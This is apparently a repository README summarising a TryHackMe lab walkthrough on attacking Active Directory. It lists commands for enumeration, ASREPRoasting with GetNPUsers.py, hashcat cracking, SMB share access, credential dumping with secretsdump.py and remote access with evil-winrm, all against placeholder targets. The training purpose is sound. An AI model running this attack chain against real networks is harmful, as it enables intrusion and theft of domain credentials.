# Attacktive Directory Lab

Welcome to the **Attacktive Directory Lab** repository! This repo contains a detailed walkthrough of the "Attacktive Directory" TryHackMe room, showcasing key techniques in Active Directory security and exploitation.

## Overview
Active Directory is a cornerstone of enterprise network management, and understanding its security is critical for any cybersecurity professional. This lab explores:
- Enumeration of Active Directory using tools like Nmap and enum4linux
- Kerberos abuse techniques, including ASREPRoasting
- SMB enumeration and exploitation
- Privilege escalation to extract sensitive data from a Domain Controller

## Key Topics Covered
1. **Enumeration:**
   - Nmap and enum4linux usage to identify services and gather domain details.

2. **Kerberos Abuse:**
   - Techniques for enumerating users and exploiting Kerberos pre-authentication vulnerabilities.

3. **SMB Exploitation:**
   - Accessing and interacting with SMB shares using `smbclient`.

4. **Privilege Escalation:**
   - Using Impacket tools like `secretsdump.py` for credential extraction.

5. **Flag Submission:**
   - Establishing remote access with `evil-winrm` to retrieve flags.

## Tools and Commands Used
- **Nmap:**
  nmap -sV -sC <target_ip>

- **enum4linux:**
  enum4linux <target_ip>

- **Kerbrute:**
  ./kerbrute -h

- **GetNPUsers.py:**
  python GetNPUsers.py -no-pass -usersfile ./users.txt -dc-ip <target_ip> spooky.local/

- **Hashcat:**
  hashcat -m 18200 hash.txt passwordlist.txt

- **SMBClient:**
  smbclient -L <target_ip> -U svc-admin
  smbclient \\\\<target_ip>\\backup -U svc-admin

- **Impacket's secretsdump.py:**
  secretsdump.py <user>:<password>@<target_ip>

- **evil-winrm:**
  evil-winrm -i <target_ip> -u <user> -p <password>

## Conclusion
This lab provides hands-on experience in understanding and exploiting Active Directory environments. By learning these techniques, you will enhance your skills in penetration testing and defensive security practices.

## Resources
- [My TryHackMe Profile](https://tryhackme.com/p/Daniel.Mwendwa)
- [Attacktive Directory Room](https://tryhackme.com/room/attacktivedirectory)

Happy hacking! 
